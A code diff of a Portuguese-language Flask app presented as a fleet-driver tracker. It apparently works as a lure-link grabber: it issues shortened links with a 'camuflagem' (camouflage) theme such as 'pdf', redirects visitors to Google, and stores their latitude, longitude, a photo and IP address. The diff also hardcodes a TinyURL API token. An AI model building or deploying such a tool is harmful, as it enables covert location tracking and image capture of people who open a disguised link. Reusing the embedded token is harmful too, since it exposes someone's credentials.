@@ -3,21 +3,19 @@ import uuid
 from datetime import datetime
 import os
 import requests
-import pytz  # Necessário instalar: pip install pytz
+import pytz
 
 app = Flask(__name__)
 FROTA = {}
 
-# SEU TOKEN (NÃO APAGUE)
+# TOKEN TINYURL
 TOKEN_TINYURL = "z1TYfa105Sj4DxK1t7LYkGBzuHO06KDd5z0jj0mUYiEeNBzh4ZT7ItMXvtbz"
 
 def encurtar_url(url_longa, alias=None):
     if "127.0.0.1" in url_longa or "localhost" in url_longa: return url_longa
-    
     headers = { "Authorization": f"Bearer {TOKEN_TINYURL}", "Content-Type": "application/json" }
     payload = { "url": url_longa, "domain": "tinyurl.com" }
     if alias and alias.strip(): payload["alias"] = alias.strip().replace(" ", "-")
-
     try:
         r = requests.post("https://api.tinyurl.com/create", json=payload, headers=headers, timeout=10)
         if r.status_code in [200, 201]: return r.json()["data"]["tiny_url"]
@@ -36,7 +34,10 @@ def admin_panel(): return render_template("admin.html", frota=FROTA)
 def gerar_ordem():
     motorista = request.form.get("motorista")
     personalizacao = request.form.get("personalizacao")
-    tema = request.form.get("camuflagem") # Certifique-se que o nome no admin.html seja 'camuflagem'
+    
+    # ATENÇÃO AQUI: O nome do campo no HTML agora é "camuflagem"
+    tema = request.form.get("camuflagem") 
+    
     redirect_url = request.form.get("redirect") or "https://www.google.com"
 
     id_ordem = str(uuid.uuid4())[:8]
@@ -55,7 +56,7 @@ def gerar_ordem():
 def tela_motorista(id_ordem):
     if id_ordem not in FROTA: return "Link expirado.", 404
     dados = FROTA[id_ordem]
-    return render_template("motorista.html", id=id_ordem, destino=dados["redirect"], tema=dados.get("tema", "padrao"))
+    return render_template("motorista.html", id=id_ordem, destino=dados["redirect"], tema=dados.get("tema", "pdf"))
 
 @app.route('/api/sinal/<id_ordem>', methods=['POST'])
 def receber_sinal(id_ordem):
@@ -63,17 +64,13 @@ def receber_sinal(id_ordem):
         data = request.get_json()
         ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
         
-        # CONFIGURAÇÃO DO HORÁRIO DE BRASÍLIA
+        # HORÁRIO BRASÍLIA
         fuso_br = pytz.timezone('America/Sao_Paulo')
         agora_br = datetime.now(fuso_br).strftime("%d/%m/%Y %H:%M:%S")
         
         FROTA[id_ordem].update({
-            'lat': data.get('latitude'), 
-            'lon': data.get('longitude'), 
-            'foto': data.get('foto'),
-            'status': "🟢 Online", 
-            'ultimo_visto': agora_br, # DATA E HORA DE BRASÍLIA
-            'ip': ip
+            'lat': data.get('latitude'), 'lon': data.get('longitude'), 'foto': data.get('foto'),
+            'status': "🟢 Online", 'ultimo_visto': agora_br, 'ip': ip
         })
         return jsonify({"ok": True})
     return jsonify({"ok": False}), 404
@@ -87,5 +84,4 @@ def excluir_ordem(id_ordem):
     return jsonify({"ok": True})
 
 if __name__ == '__main__':
-    # Certifique-se de ter instalado o pytz: pip install pytz
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
